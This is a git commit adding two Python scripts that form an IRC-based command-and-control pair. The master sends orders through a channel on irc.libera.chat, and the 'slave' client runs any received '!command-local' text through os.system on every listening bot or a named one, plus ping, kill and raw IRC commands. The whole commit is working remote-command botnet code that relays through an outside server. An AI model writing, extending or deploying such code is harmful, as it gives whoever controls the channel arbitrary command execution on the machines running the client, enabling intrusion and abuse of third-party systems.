8ec1a4a592c1c216d6e9046073013512a242bbc0
Galladite <65728527+Galladite27@users.noreply.github.com>
2022-01-08 21:52:16 +0000

    Add files via upload

---
+++ master.py
@@ -0,0 +1,105 @@
+# -imports-
+import socket
+import threading
+
+# -definitions-
+def sendmsg(message: str):
+    irc.send(("PRIVMSG " + channel + " :" + message + "\r\n").encode())
+
+command = ""
+def reply():
+    while True:
+        command = str(input("> "))
+        commands(command)
+        print("")
+
+# -server settings-
+server = "irc.libera.chat"
+port = 6667
+channel = "#Galladite"
+nickname = "bot-control"
+
+# -help command list-
+commandList = [
+        "activate <password> - identify, allowing you to give orders",
+        "command-local <bot name> <command> - force a bot to attempt a local command using os.system",
+        "command <command> - execute an IRC command as this bot",
+        "help - get this list",
+        "kill <bot name> - disconnect a bot and stop the script",
+        "ping <bot name> - make a bot send a message to IRC to check they are available",
+        "sendmsg <message> - directly send a message to the channel",
+        "\nAny instance of <bot name> may also be replaced by \"all\""
+        ]
+
+# -command definitions-
+def commands(command):
+    if command.split(" ")[0] == "activate":
+        irc.send(("privmsg nickserv :identify bot-control " + command.split(" ")[1] + "\r\n").encode(encoding="UTF-8"))
+        print("Activated.")
+
+    if command.split(" ")[0] == "command":
+        msgToSend = command.split(" ")[1:] #get the command from the message
+        irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
+        print("Command sent.")
+
+    if command.split(" ")[0] == "command-local":
+        sendmsg("!command-local " + " ".join(command.split(" ")[1:]))
+
+    if command == "help":
+        print("Commands:")
+        for i in range(0, len(commandList)):
+            print(commandList[i])
+
+    if command.split(" ")[0] == "kill":
+        if command.split(" ")[1] == "all":
+            sendmsg("!kill all")
+            print("All bots killed.")
+        else:
+            sendmsg("!kill " + command.split(" ")[1])
+            print("Bot " + command.split(" ")[1] + " killed.")
+
+    if command.split(" ")[0] == "ping":
+        if command.split(" ")[1] == "all":
+            sendmsg("!ping all")
+            print("All bots pinged.")
+        else:
+            sendmsg("!ping " + command.split(" ")[1])
+            print("Bot " + command.split(" ")[1] + " pinged.")
+
+    if command.split(" ")[0] == "sendmsg":
+        msgToSend = command.split(" ")
+        msgToSend.pop(0)
+        sendmsg(" ".join(msgToSend))
+        print("Message sent.")
+
+
+# ---necessary stuff: don't edit this---
+# -connection to server-
+print("Connecting...")
+irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+irc.connect((server, port))
+irc.send(("USER " + nickname + " " + nickname + " " + nickname + " :bot\r\n").encode(encoding="UTF-8"))
+irc.send(("NICK " + nickname + "\r\n").encode(encoding="UTF-8"))
+irc.send(("JOIN " + channel + "\r\n").encode(encoding="UTF-8"))
+
+while True:
+    recieved = irc.recv(2048).decode("UTF-8")
+    if recieved.__contains__("/NAMES") :
+        log = open("history.log", "a")
+        print("Connected.")
+        break
+
+getCommands = threading.Thread(target=reply)
+getCommands.start()
+
+# -main loop-
+while True:
+    # -recieve messages-
+    recieved = irc.recv(2048).decode("UTF-8")
+
+    # -logging-
+    log.write(recieved)
+
+    # -stay alive-
+    if recieved.startswith("PING"):
+        irc.send(("PONG " + recieved.split()[1] + "\r\n").encode())
---
+++ slave.py
@@ -0,0 +1,83 @@
+# -imports-
+import os
+import random
+import socket
+
+# from hashlib import sha512
+# from Crypto.PublicKey import RSA # requires pycryptodome
+
+# -definitions-
+def sendmsg(message: str):
+    irc.send(("PRIVMSG " + channel + " :" + message + "\r\n").encode(encoding="UTF-8"))
+
+def identify():
+    irc.send(("WHOIS bot-control\r\n").encode(encoding="UTF-8"))
+    while True:
+        recieved = irc.recv(2048).decode("UTF-8")
+        if "logged in as" in recieved:
+            return True
+        if "End of /WHOIS list." in recieved:
+            return False
+
+def verifyCommand():
+    if recieved.split("!")[0] == ":bot-control" and identify() == True:
+        print("Accepted.")
+        commands()
+
+# -server settings-
+server = "irc.libera.chat"
+port = 6667
+channel = "#Galladite"
+nickname = "bot" + str(random.randint(1, 99999))
+
+# -command definitions-
+def commands():
+    if ":!command-local" + nickname in recieved or ":!command-local all" in recieved:
+        if ":!command-local all" in recieved:
+            command = recieved.split(":!command-local all ")[1]
+            command = command[:len(command)-2]
+            os.system(command)
+        else:
+            print("aaa")
+            command = recieved.split(nickname + " ")[1]
+            command = command[:len(command)-2]
+            os.system(command)
+
+    if ":!ping " + nickname in recieved or ":!ping all" in recieved:
+        sendmsg("Pong!")
+
+    if ":!kill " + nickname in recieved or ":!kill all" in recieved:
+        irc.close()
+        quit()
+
+    if ":!irc-command " + nickname in recieved:
+        msgToSend = recieved.split(nickname + " ")[1].split("\r")[0].split(" ") # get the command from the message
+        irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
+
+# ---necessary stuff: don't edit this---
+# -connection to server-
+irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+irc.connect((server, port))
+irc.send(("USER " + nickname + " " + nickname + " " + nickname + " :bot\r\n").encode(encoding="UTF-8"))
+irc.send(("NICK " + nickname + "\r\n").encode(encoding="UTF-8"))
+irc.send(("JOIN " + channel + "\r\n").encode(encoding="UTF-8"))
+
+while True:
+    recieved = irc.recv(2048).decode("UTF-8")
+    if recieved.__contains__("/NAMES") :
+        break
+
+# -main loop-
+while True:
+    # -recieve messages-
+    recieved = irc.recv(2048).decode("UTF-8")
+
+    # -stay alive-
+    if recieved.startswith("PING"):
+        irc.send(("PONG " + recieved.split()[1] + "\r\n").encode())
+
+    # -attempt commands-
+    try:
+        verifyCommand()
+    except:
+        pass
